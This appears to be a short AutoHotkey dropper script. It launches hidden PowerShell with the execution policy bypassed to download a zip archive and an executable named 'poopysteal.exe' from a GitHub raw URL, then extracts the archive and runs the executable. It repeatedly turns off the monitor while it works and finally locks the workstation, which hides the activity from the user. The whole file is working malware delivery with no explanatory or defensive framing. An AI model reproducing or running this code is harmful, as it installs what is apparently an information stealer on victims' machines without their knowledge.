Run, powershell -ExecutionPolicy Bypass -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/_internal.zip' -OutFile .\poop.zip
SendMessage,0x112,0xF170,2,,Program Manager
Sleep, 10000
Run, powershell -ExecutionPolicy Bypass -WindowStyle Hidden Hidden Expand-Archive -Path poop.zip -DestinationPath .
Run, powershell -ExecutionPolicy Bypass -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/poopysteal.exe' -OutFile .\poop.exe
SendMessage,0x112,0xF170,2,,Program Manager
Sleep, 10000
Run, powershell -ExecutionPolicy Bypass -WindowStyle Hidden Invoke-Item .\poop.exe


SendMessage,0x112,0xF170,2,,Program Manager

DllCall("user32.dll\LockWorkStation")
